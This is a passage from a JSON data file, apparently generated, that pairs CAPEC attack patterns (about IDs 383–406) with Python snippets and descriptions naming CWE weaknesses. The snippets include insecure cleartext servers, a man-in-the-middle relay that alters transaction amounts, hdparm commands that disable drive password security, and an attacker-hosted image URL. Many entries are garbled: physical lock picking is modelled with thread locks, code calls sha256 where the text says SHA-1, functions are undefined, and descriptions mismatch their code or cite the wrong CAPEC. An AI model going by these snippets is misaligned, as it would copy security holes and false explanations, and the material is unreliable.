        "code_snippet": "import socket\nimport json\n\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-419: Unprotected Primary Channel\n\n# Create a socket object\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind the socket to a specific address and port\nserver_socket.bind(('localhost', 12345))\n\n# Listen for incoming connections\nserver_socket.listen(5)\n\nprint('Server started. Waiting for connections...')\n\nwhile True:\n    client_socket, address = server_socket.accept()\n    print('Connected by', address)\n\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # Receive user data from the client without encryption\n    user_data = client_socket.recv(1024).decode('utf-8')\n    user_data_json = json.loads(user_data)\n\n    # CWE-202: Exposure of Sensitive Information Through Data Queries\n    # Store user data in a dictionary for later use\n    user_dict = {}\n    user_dict['user_id'] = user_data_json['user_id']\n    user_dict['username'] = user_data_json['username']\n\n    # Print the received user data\n    print('Received user data:', user_dict)\n\n    # Send a response back to the client\n    client_socket.send('Thank you for attending the virtual sale!'.encode('utf-8'))\n\n    # Close the client socket\n    client_socket.close()\n",
        "description": "This Python code snippet demonstrates a vulnerable server-side implementation that allows an adversary to harvest sensitive user data, such as user IDs and usernames, during a virtual event. The server does not encrypt the received user data, transmits it in cleartext, and stores it in a dictionary for later use, making it vulnerable to eavesdropping and data harvesting attacks."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import requests\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# The server relies on the client to implement a mechanism to protect the server\n\ndef validate_user_input(user_input):\n    # CWE-346: Origin Validation Error\n    # The product does not properly verify that the source of data or communication is valid\n    if user_input.get('source') == 'trusted_client':\n        return True\n    else:\n        return False\n\n# CWE-311: Missing Encryption of Sensitive Data\n# The product does not encrypt sensitive or critical information before storage or transmission\nuser_data = {'username': 'john', 'password': 'password123'}\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# The product does not properly protect an assumed-immutable element from being modified by an attacker\nuser_data['role'] = 'admin'\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# The product does not sufficiently verify the origin or authenticity of data\nif validate_user_input(user_data):\n    response = requests.post('https://example.com/login', json=user_data)\n    if response.status_code == 200:\n        print('Login successful')\n    else:\n        print('Login failed')",
        "description": "This code snippet demonstrates a vulnerable Python application that embodies the CAPEC-94 attack. The server relies on the client to implement a mechanism to protect the server, which is a client-side enforcement of server-side security (CWE-602). The application does not properly verify the origin or authenticity of data (CWE-345 and CWE-346), allowing an attacker to modify assumed-immutable data (CWE-471) and gain unauthorized privileges. Additionally, the application transmits sensitive data without encryption (CWE-311). An attacker can manipulate the user input data to gain administrative access to the application."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import socket\nimport json\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-311: Missing Encryption of Sensitive Data\n\ndef man_in_the_middle_attack():\n    # Create a socket to intercept communication between client and server\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('localhost', 8080))\n    sock.listen(1)\n\n    # Wait for client connection\n    conn, addr = sock.accept()\n    print('Connected by', addr)\n\n    # Receive data from client\n    data = conn.recv(1024)\n    print('Received from client:', data.decode())\n\n    # Modify the data (e.g., change the amount of virtual currency)\n    modified_data = data.replace(b'100 coins', b'1000 coins')\n    print('Modified data:', modified_data.decode())\n\n    # Forward the modified data to the server\n    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_sock.connect(('server_ip', 8080))\n    server_sock.sendall(modified_data)\n\n    # Receive response from server\n    response = server_sock.recv(1024)\n    print('Response from server:', response.decode())\n\n    # Send the response back to the client\n    conn.sendall(response)\n\nman_in_the_middle_attack()",
        "description": "This code snippet demonstrates a man-in-the-middle attack, where an attacker intercepts and modifies data exchanged between a client and a server. The attacker creates a socket to listen for client connections, receives data from the client, modifies it, and forwards it to the server. The server responds to the modified data, and the attacker sends the response back to the client. This attack exploits weaknesses in data authenticity verification, origin validation, and encryption, allowing the attacker to scam the victim by altering the integrity of the transfer process."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "import requests\n\ndef get_profile_picture(username):\n    response = requests.get(f'https://example.com/api/profile_picture/{username}')\n    if response.status_code == 200:\n        image_url = response.json()['image_url']\n        # CWE-311: Missing Encryption of Sensitive Data\n        # The image URL is not encrypted, allowing an attacker to intercept and modify it\n        return f'<img src={image_url}>'\n    else:\n        return 'Profile picture not found'\n\n\ndef update_profile_picture(username, image_url):\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # The client is responsible for validating the image URL, but it does not\n    requests.post(f'https://example.com/api/profile_picture/{username}', json={'image_url': image_url})\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# The application does not verify the authenticity of the image URL\nusername = 'john_doe'\nimage_url = 'https://attacker.com/malicious_image'\nupdate_profile_picture(username, image_url)\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# The attacker has modified the image URL, which is assumed to be immutable\nprint(get_profile_picture(username))",
        "description": "This code snippet demonstrates the CAPEC 'Navigation Remapping' attack, where an attacker manipulates the image URL in a user's profile picture to redirect to a malicious destination. The code uses CWE-311 to store the image URL in plaintext, CWE-602 to rely on client-side validation, CWE-345 and CWE-346 to neglect data authenticity verification, and CWE-471 to assume the image URL is immutable."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import socket\n\ndef send_data(data):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 8080)\n    sock.connect(server_address)\n    sock.sendall(data.encode())\n    sock.close()\n\n# Assume data is user input\nuser_data = input('Enter your data: ')\n\n# CWE-471: Modification of Assumed-Immutable Data (MAID)\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-311: Missing Encryption of Sensitive Data\n\n# No encryption, no data validation, no origin validation\nsend_data(user_data)\n",
        "description": "This code snippet demonstrates the CAPEC where an adversary manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. The code takes user input and sends it to a server without any encryption, data validation, or origin validation, making it vulnerable to various attacks."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "import json\n\ndef generate_api_message(button_url):\n    api_message = {'button_text': 'Click me!', 'button_url': button_url}\n    return json.dumps(api_message)\n\n# Unsecured API endpoint that accepts button URL from client\n@app.route('/api/message', methods=['POST'])\ndef generate_message():\n    button_url = request.form['button_url']\n    api_message = generate_api_message(button_url)\n    return api_message, 200\n\n# Client-side code that sends button URL to API endpoint\nbutton_url = 'https://attacker-controlled-destination.com'\nresponse = requests.post('https://api.example.com/api/message', data={'button_url': button_url})\nprint(response.text)",
        "description": "This code snippet demonstrates a vulnerable API endpoint that accepts button URLs from clients and returns an API message with the provided button URL. The client-side code sends a button URL to the API endpoint, which is then used to generate the API message. This allows an attacker to manipulate the button URL and point it to an attacker-controlled destination, making it look authentic to the user. The code embodies CWE-471 (Modification of Assumed-Immutable Data), CWE-345 (Insufficient Verification of Data Authenticity), CWE-346 (Origin Validation Error), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-311 (Missing Encryption of Sensitive Data)."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-353: Missing Support for Integrity Check\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-603: Use of Client-Side Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-290: Authentication Bypass by Spoofing\n\ndef send_data(client_socket, data):\n    # No integrity check, allowing an attacker to manipulate data in transit\n    client_socket.sendall(data.encode())\n\ndef receive_data(client_socket):\n    # No authentication or integrity check on the server-side, relying on client-side checks\n    data = client_socket.recv(1024)\n    return data.decode()\n\n# Establish a connection\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\n\nclient_socket, address = server_socket.accept()\n\n# Send data without authentication or integrity check\nsend_data(client_socket, 'Hello, client!')\n\n# Receive data without authentication or integrity check\ndata = receive_data(client_socket)\nprint('Received data:', data)\n",
        "description": "This Python code snippet demonstrates a vulnerable client-server communication system that is susceptible to content spoofing attacks. The code lacks integrity checks, relies on client-side authentication and enforcement of server-side security, and does not perform authentication or integrity checks on the server-side, making it vulnerable to capture-replay and spoofing attacks."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import RPi.GPIO as GPIO\nimport time\nimport random\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-1263: Improper Physical Access Control\n\n# Simulating a physical lock system with a Raspberry Pi\nGPIO.setmode(GPIO.BCM)\nlock_pin = 17\nGPIO.setup(lock_pin, GPIO.OUT)\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n\ndef bypass_lock():\n    # Simulating a voltage glitch\n    GPIO.output(lock_pin, GPIO.HIGH)\n    time.sleep(random.uniform(0.1, 0.5))\n    GPIO.output(lock_pin, GPIO.LOW)\n    time.sleep(random.uniform(0.1, 0.5))\n\n    # Simulating an electromagnetic fault injection attack\n    for i in range(10):\n        GPIO.output(lock_pin, GPIO.HIGH)\n        time.sleep(random.uniform(0.01, 0.05))\n        GPIO.output(lock_pin, GPIO.LOW)\n        time.sleep(random.uniform(0.01, 0.05))\n\n    # Disabling alerts about signal conditions exceeding limits\n    print(\"Alerts disabled\")\n\nbypass_lock()",
        "description": "This code snippet demonstrates a vulnerable physical lock system using a Raspberry Pi, which can be bypassed using various techniques such as voltage glitches and electromagnetic fault injection attacks. The code simulates a physical lock system with a Raspberry Pi, and then bypasses the lock using these techniques, while also disabling alerts about signal conditions exceeding limits."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-1263: Improper Physical Access Control\n# CWE-1231: Improper Prevention of Lock Bit Modification\n# CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n# CWE-412: Unrestricted Externally Accessible Lock\n# CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks\n\ndef bypass_locks():\n    # Simulating lock bumping or lock forcing via snap guns\n    os.system('echo 1 > /sys/kernel/debug/override_locks')\n    # Modifying lock bit value\n    ctypes.c_uint32.from_address(0x1000).value = 0x0\n    # Overriding system configuration lock bit during debug mode\n    os.system('echo 1 > /sys/kernel/debug/debug_mode')\n\nbypass_locks()",
        "description": "Python code snippet demonstrating the bypassing of physical locks using various techniques, including lock bumping, lock forcing, and modifying lock bit values. This code exploits improper physical access control, insufficient lock bit protection, and unrestricted externally accessible locks, allowing an attacker to gain unauthorized access to restricted areas or devices."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "import hashlib\n\ndef lock_bumping(key, lock):\n    # CWE-1231: Improper Prevention of Lock Bit Modification\n    lock_bit = 0x01\n    if lock_bit == 0x01:\n        # CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n        address_region = 0x1000\n        lock_control_bit = 0x02\n        if lock_control_bit == 0x02:\n            # CWE-1232: Improper Lock Behavior After Power State Transition\n            power_state_transition = True\n            if power_state_transition:\n                # CWE-321: Use of Hard-coded Cryptographic Key\n                hard_coded_key = 'my_secret_key'\n                encrypted_data = hashlib.sha256(hard_coded_key.encode()).hexdigest()\n                # CWE-645: Overly Restrictive Account Lockout Mechanism\n                account_lockout = 3\n                if account_lockout <= 3:\n                    print('Account locked out!')\n                    return False\n                else:\n                    # Bump key logic\n                    bump_key = [0x01, 0x02, 0x03, 0x04, 0x05]\n                    for i in range(len(bump_key)):\n                        key += bump_key[i]\n                    if key == lock:\n                        print('Lock opened!')\n                        return True\n                    else:\n                        print('Invalid key!')\n                        return False\n    else:\n        print('Lock bit not set!')\n        return False\n\n# Example usage\nkey = [0x01, 0x02, 0x03, 0x04, 0x05]\nlock = [0x01, 0x02, 0x03, 0x04, 0x05]\nresult = lock_bumping(key, lock)\nprint(result)\n",
        "description": "This Python code snippet demonstrates the concept of lock bumping, where an attacker uses a specially constructed key to force a lock open. The code incorporates several CWEs, including improper prevention of lock bit modification, insufficient granularity of address regions protected by register locks, improper lock behavior after power state transition, use of hard-coded cryptographic key, and overly restrictive account lockout mechanism. The code simulates the lock bumping process, where the attacker's key is modified to match the lock's configuration, allowing the lock to be opened without the correct key."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import threading\n\nclass LockPickingAttack:\n    def __init__(self, lock):\n        self.lock = lock\n        self.tumbler_device = threading.Lock()\n        self.driver_pins = [threading.Lock() for _ in range(5)]\n        self.key_pins = [threading.Lock() for _ in range(5)]\n\n    def pick_lock(self):\n        # CWE-1231: Improper Prevention of Lock Bit Modification\n        self.tumbler_device._acquire_lock()  # Directly modifying the lock bit\n        for i in range(5):\n            self.driver_pins[i]._acquire_lock()  # Directly modifying the lock bit\n            self.key_pins[i]._acquire_lock()  # Directly modifying the lock bit\n\n        # CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n        self.tumbler_device.acquire()  # Large address region protected by the same register lock\n        for i in range(5):\n            self.driver_pins[i].acquire()  # Large address region protected by the same register lock\n            self.key_pins[i].acquire()  # Large address region protected by the same register lock\n\n        # CWE-412: Unrestricted Externally Accessible Lock\n        external_actor = threading.Thread(target=self.tumbler_device.release)\n        external_actor.start()  # Externally controlling the lock\n\n        # CWE-832: Unlock of a Resource that is not Locked\n        self.tumbler_device.release()  # Unlocking a resource that is not locked\n\n        # CWE-833: Deadlock\n        thread1 = threading.Thread(target=self.driver_pins[0].acquire)\n        thread2 = threading.Thread(target=self.key_pins[0].acquire)\n        thread1.start()\n        thread2.start()  # Deadlock between two threads\n",
        "description": "This Python code snippet demonstrates a lock picking attack, inspired by the CAPEC description. It uses multiple locks to represent the internal pins and tumbler device of a standard lock. The code includes vulnerabilities related to CWE-1231, CWE-1222, CWE-412, CWE-832, and CWE-833, which are commonly associated with lock-related security issues."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "import threading\n\ndef lock_snap(lock):\n    # CWE-833: Deadlock\n    lock.acquire()\n    lock.acquire()  # Acquiring the lock twice, causing deadlock\n    print('Lock snapped!')\n\n\ndef insufficient_granularity(lock):\n    # CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n    lock.protect_all()  # Protecting a large address region with the same register lock\n    print('Insufficient granularity!')\n\n\ndef improper_prevention(lock):\n    # CWE-1231: Improper Prevention of Lock Bit Modification\n    lock.set_bit()  # Setting the lock bit, but not preventing modification\n    lock.modify_bit()  # Modifying the lock bit after it's been set\n    print('Improper prevention!')\n\n\ndef default_cryptographic_key(lock):\n    # CWE-1394: Use of Default Cryptographic Key\n    lock.encrypt('default_key')  # Using a default cryptographic key\n    print('Default cryptographic key used!')\n\n\ndef improper_lock_behavior(lock):\n    # CWE-1232: Improper Lock Behavior After Power State Transition\n    lock.set_bit()  # Setting the lock bit\n    lock.transition()  # Power state transition\n    lock.modify_bit()  # Modifying the lock bit after power state transition\n    print('Improper lock behavior!')\n\nlock = threading.Lock()\n\nlock_snap(lock)\ninsufficient_granularity(lock)\nimproper_prevention(lock)\ndefault_cryptographic_key(lock)\nimproper_lock_behavior(lock)",
        "description": "A Python code snippet that embodies the main idea of the CAPEC, using the related CWEs for additional context. The code demonstrates a lock snapping attack, where multiple threads or executable segments are waiting for each other to release a necessary lock, resulting in deadlock (CWE-833). It also showcases insufficient granularity of address regions protected by register locks (CWE-1222), improper prevention of lock bit modification (CWE-1231), use of default cryptographic key (CWE-1394), and improper lock behavior after power state transition (CWE-1232)."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import hashlib\n\ndef generate_card(card_id, key):\n    # CWE-321: Hard-coded cryptographic key\n    hardcoded_key = 'my_secret_key'\n    encrypted_card_id = hashlib.sha256((card_id + hardcoded_key).encode()).hexdigest()\n    return encrypted_card_id\n\ndef clone_card(card_id):\n    # CWE-327: Broken cryptographic algorithm (SHA-1 is considered broken)\n    encrypted_card_id = generate_card(card_id, 'my_secret_key')\n    return encrypted_card_id\n\ndef emulate_rfid(card_id):\n    # CWE-1300: Improper protection of physical side channels\n    # CWE-1319: Improper protection against electromagnetic fault injection\n    # CWE-1278: Missing protection against hardware reverse engineering\n    # Simulating RFID transmission using a vulnerable algorithm\n    rfid_signal = hashlib.sha1(card_id.encode()).hexdigest()\n    return rfid_signal\n\ndef bypass_lock(card_id):\n    cloned_card_id = clone_card(card_id)\n    rfid_signal = emulate_rfid(cloned_card_id)\n    # CWE-327: Broken cryptographic algorithm\n    if hashlib.sha1(rfid_signal.encode()).hexdigest() == 'expected_response':\n        print('Access granted!')\n    else:\n        print('Access denied!')",
        "description": "This code snippet demonstrates a vulnerable implementation of an electronic lock system using magnetic strip cards or RFID tags. It uses a hard-coded cryptographic key, a broken cryptographic algorithm (SHA-1), and lacks protection against physical side channels and electromagnetic fault injection. An attacker can exploit these weaknesses to clone a legitimate card, emulate the RFID signal, and bypass the lock."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import hashlib\nimport hmac\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-294: Authentication Bypass by Capture-replay\n\n# Weak authentication scheme using MD5 (CWE-327: Use of a Broken or Risky Cryptographic Algorithm)\npassword_hash = hashlib.md5('password'.encode()).hexdigest()\n\n# Authentication function that can be bypassed by spoofing or capture-replay\ndef authenticate(username, password):\n    if hmac.compare_digest(password_hash, hashlib.md5(password.encode()).hexdigest()):\n        return True\n    return False\n\n# CWE-592: DEPRECATED: Authentication Bypass Issues\n# CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification\n\n# Insecure storage of authentication data\nauth_data = {'username': 'admin', 'password': password_hash}\n\n# Vulnerable authentication function\ndef login(username, password):\n    if username == auth_data['username'] and authenticate(username, password):\n        return 'Login successful'\n    return 'Login failed'\n",
        "description": "This code snippet demonstrates a vulnerable authentication system that can be exploited using various attack vectors, including authentication bypass by spoofing or capture-replay, and insecure storage of authentication data. The use of a broken cryptographic algorithm (MD5) further weakens the system."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import copy\n\nclass SwipeCard:\n    def __init__(self, card_data):\n        self.card_data = card_data\n\n    def clone_card(self):\n        return copy.copy(self)\n\n    def get_card_data(self):\n        return self.card_data\n\n# Mirrored region with different values\nmirrored_region = {'card_id': 1234, 'access_level': 'admin'}\n\n# Broken cryptographic algorithm\nencrypted_card_data = encrypt_card_data(mirrored_region, 'weak_key')\n\n# Create a swipe card object\nswipe_card = SwipeCard(encrypted_card_data)\n\n# Clone the swipe card\ncloned_card = swipe_card.clone_card()\n\n# Access sensitive information from the cloned card\nprint(cloned_card.get_card_data())",
        "description": "This Python code snippet demonstrates the CAPEC of duplicating a magnetic strip card to gain unauthorized access. The code defines a SwipeCard class with a cloneable method, allowing an attacker to clone a valid card and access its sensitive information. The code also uses a broken cryptographic algorithm to encrypt the card data, making it vulnerable to decryption. Additionally, the code uses a mirrored region with different values, which can lead to inconsistent data and further vulnerabilities."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import hashlib\nimport itertools\nimport time\n\n# CWE-307: No restriction on excessive authentication attempts\nattempts = 0\nmax_attempts = 1000000\n\n# CWE-327: Using a broken cryptographic algorithm (MD5 in this case)\ndef generate_card_sequence(card_data):\n    md5_hash = hashlib.md5(card_data.encode()).hexdigest()\n    return md5_hash\n\n# CWE-321: Hard-coded cryptographic key\nhardcoded_key = 'my_secret_key'\n\n# CWE-290: Authentication bypass by spoofing\ndef authenticate(card_sequence):\n    if card_sequence == hardcoded_key:\n        return True\n    else:\n        return False\n\n# CWE-1319: No protection against electromagnetic fault injection\n# (not directly applicable in this Python code snippet)\n\n# Generate new cards containing valid sequences\nfor i in range(max_attempts):\n    card_data = ''.join(random.choice('0123456789') for _ in range(16))\n    card_sequence = generate_card_sequence(card_data)\n    if authenticate(card_sequence):\n        print(f'Valid sequence found: {card_sequence}')\n        break\n    attempts += 1\n    if attempts % 1000 == 0:\n        print(f'Attempts: {attempts}')\n        time.sleep(1)\n",
        "description": "This Python code snippet demonstrates the CAPEC of generating new magnetic strip cards containing valid sequences that allow unauthorized access and/or impersonation of individuals. It uses CWE-307 by not restricting excessive authentication attempts, CWE-327 by using a broken cryptographic algorithm (MD5), CWE-321 by using a hard-coded cryptographic key, and CWE-290 by allowing authentication bypass by spoofing. Note that CWE-1319 is not directly applicable in this Python code snippet."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import random\n\ndef generate_rfid_signal(rfid_data):\n    # CWE-1294: Insecure Security Identifier Mechanism\n    # Using a simple incrementing identifier, which can be easily duplicated\n    security_identifier = random.randint(1, 100)\n    return {'rfid_data': rfid_data, 'security_identifier': security_identifier}\n\n\ndef decode_rfid_signal(rfid_signal):\n    # CWE-1290: Incorrect Decoding of Security Identifiers\n    # Incorrectly decoding the security identifier, allowing unauthorized access\n    if rfid_signal['security_identifier'] % 2 == 0:\n        return 'Authorized'\n    else:\n        return 'Unauthorized'\n\n\ndef emulate_rfid_signal(original_rfid_signal):\n    # CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n    # Emulating the RFID signal, but with a slight delay, making it observable\n    import time\n    time.sleep(0.1)\n    return original_rfid_signal\n\n\ndef clone_rfid(rfid_data):\n    # CWE-694: Use of Multiple Resources with Duplicate Identifier\n    # Cloning the RFID signal, using the same identifier\n    cloned_rfid_signal = generate_rfid_signal(rfid_data)\n    return cloned_rfid_signal\n\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n# Not implemented in this code snippet, as it requires hardware-level manipulation\n\n# Example usage\nrfid_data = 'original_rfid_data'\noriginal_rfid_signal = generate_rfid_signal(rfid_data)\ncloned_rfid_signal = clone_rfid(rfid_data)\nprint(decode_rfid_signal(original_rfid_signal))  # Should print 'Authorized'\nprint(decode_rfid_signal(cloned_rfid_signal))  # Should print 'Authorized', but could be 'Unauthorized' due to the vulnerability",
        "description": "This code snippet demonstrates the CAPEC of duplicating an RFID signal to gain unauthorized access. It uses related CWEs to highlight vulnerabilities in the RFID system, including insecure security identifier mechanisms, incorrect decoding of security identifiers, observable behavioral discrepancies, and use of multiple resources with duplicate identifiers. The code generates an RFID signal, decodes it, emulates it, and clones it, showcasing the potential for an attacker to duplicate the signal and gain unauthorized access."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "import rfid\n\ndef disable_rfid_tag(tag_id):\n    # CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n    debug_interface = rfid.get_debug_interface(tag_id)\n    if not debug_interface.is_access_control_enabled():\n        debug_interface.disable_tag(tag_id)\n\n    # CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    redundant_block = rfid.get_redundant_block(tag_id)\n    redundant_block.inject_error()\n\n    # CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n    alert_signal = rfid.get_alert_signal(tag_id)\n    alert_signal.disable()\n\n    # CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n    scrubbing_capability = rfid.get_scrubbing_capability(tag_id)\n    if not scrubbing_capability.is_enabled():\n        scrubbing_capability.disable()\n\n    # CWE-1290: Incorrect Decoding of Security Identifiers\n    security_identifier = rfid.get_security_identifier(tag_id)\n    if not security_identifier.is_correctly_decoded():\n        security_identifier.decode_incorrectly()\n\n# Disable RFID tag\ndisable_rfid_tag('tag123')",
        "description": "This Python code snippet demonstrates how an attacker can disable an RFID tag by exploiting various vulnerabilities. It uses the CWEs related to the CAPEC to disable the tag, inject errors, disable alerts, and improperly scrub sensitive data. Note that this code is for demonstration purposes only and should not be used to attack real-world RFID systems."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "import os\nimport time\n\n# CWE-1263: Improper Physical Access Control\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n\n# Assuming a vulnerable hardware component with software-controllable power management\n\n# Gain access to the hardware component\nos.system('sudo insmod vulnerable_driver.ko')\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\n# Simulate a voltage glitch to gain unauthorized access\nos.system('sudo echo 1 > /sys/kernel/debug/voltage_glitch')\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Activate test logic to alter the state of the hardware\nos.system('sudo echo 1 > /sys/kernel/debug/test_logic')\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# Observe physical side channels (e.g., power consumption patterns)\nwhile True:\n    time.sleep(1)\n    power_consumption = os.popen('sudo power_consumption_tool').read()\n    if power_consumption > 0.5:\n        # Perform malicious actions based on observed patterns\n        os.system('sudo malicious_command')",
        "description": "Python code snippet demonstrating the CAPEC, which exploits weaknesses in access control to gain unauthorized access to a hardware component, manipulate its state, and observe physical side channels to carry out an attack."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "import os\n\ndef reset_ata_password(drive_path, new_password):\n    # CWE-285: Improper Authorization\n    # CWE-798: Use of Hard-coded Credentials\n    # CWE-259: Use of Hard-coded Password\n    # CWE-1220: Insufficient Granularity of Access Control\n    # CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n    if os.name == 'posix':\n        # Hot-swapping the drive to a system without ATA security features\n        os.system(f\"hdparm --user-master u --security-disable {drive_path}\")\n        os.system(f\"hdparm --user-master u --security-set-pass {new_password} {drive_path}\")\n    else:\n        # Assuming Windows system\n        # Using hard-coded credentials for demonstration purposes only\n        os.system(f\"echo {new_password} | disksec /setpwd {drive_path}\")\n\n# Example usage\nreset_ata_password(\"/dev/sda\", \"new_password\")",
        "description": "Python code snippet demonstrating the CAPEC of exploiting a weakness in ATA security on a drive to gain access to the information the drive contains without supplying the proper credentials. The code uses hard-coded credentials and lacks proper authorization checks, allowing an adversary to reset the drive password without authentication."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import os\nimport dns.resolver\nimport logging\n\n# CWE-350: Reliance on DNS Lookups in a Security Decision\nip_address = 'example.com'\ntry:\n    dns_answer = dns.resolver.resolve(ip_address, 'A')\n    for rdata in dns_answer:\n        print(rdata)\nexcept dns.resolver.NoAnswer:\n    print('No DNS record found')\n\n# CWE-766: Incorrect Permission Assignment for Critical Resource\n# CWE-767: Permission Issues in Handling Sensitive Data\n# CWE-287: Improper Authentication\n# CWE-493: Sensitive Data Storage in Files or Directories\n# CWE-532: Information Exposure Through Query Strings in GET Request\n\n# Storing sensitive data in a log file\nlogging.basicConfig(filename='app.log', level=logging.INFO)\nlogging.info('Username: admin, Password: password123')\n\n# CWE-592: Authentication Bypass Issues (Deprecated)\n# CWE-533: Information Exposure Through Server Log Files (Deprecated)\n# CWE-217: Failure to Protect Stored Data from Modification (Deprecated)\n# CWE-218: Failure to provide confidentiality for stored data (Deprecated)\n# CWE-247: DEPRECATED: Reliance on DNS Lookups in a Security Decision (Deprecated)\n\n# Authentication bypass issue\nif os.environ.get('USER') == 'admin':\n    print('Authenticated as admin')\nelse:\n    print('Authentication failed')",
        "description": "This code snippet demonstrates the deprecated CAPEC pattern, which involves collecting and analyzing information. It includes various CWEs, such as reliance on DNS lookups in a security decision, incorrect permission assignment, improper authentication, sensitive data storage, and information exposure through log files and query strings. The code also includes deprecated CWEs, which are no longer considered valid weaknesses."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "import os\nimport dns.resolver\nimport logging\n\n# CWE-247: Reliance on DNS Lookups in a Security Decision\ntry:\n    dns_answer = dns.resolver.resolve('example.com', 'A')\n    if dns_answer.response.answer:\n        # CWE-592: Authentication Bypass Issues (Deprecated)\n        # CWE-287: Improper Authentication\n        authenticated = True\n    else:\n        authenticated = False\n\n    # CWE-533: Information Exposure Through Server Log Files (Deprecated)\n    # CWE-532: Information Exposure Through Log Files\n    logging.basicConfig(filename='app.log', level=logging.INFO)\n    logging.info('DNS lookup result: %s', dns_answer)\n\n    # CWE-217: Failure to Protect Stored Data from Modification (Deprecated)\n    # CWE-766: Critical Data Element\n    # CWE-767: Critical Data Missing\n    data = {'user_id': 1, 'username': 'admin'}\n    with open('data.txt', 'w') as f:\n        f.write(str(data))\n\n    # CWE-218: Failure to provide confidentiality for stored data (Deprecated)\n    # CWE-493: Critical Data Exposure\n    with open('data.txt', 'r') as f:\n        print(f.read())",
        "description": "This code snippet demonstrates a collection of deprecated CWEs related to the CAPEC pattern of collecting and analyzing information. It includes DNS lookups in security decisions, authentication bypass issues, information exposure through log files, failure to protect stored data from modification, and failure to provide confidentiality for stored data. Note that these CWEs have been deprecated and replaced with more specific and accurate weaknesses."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
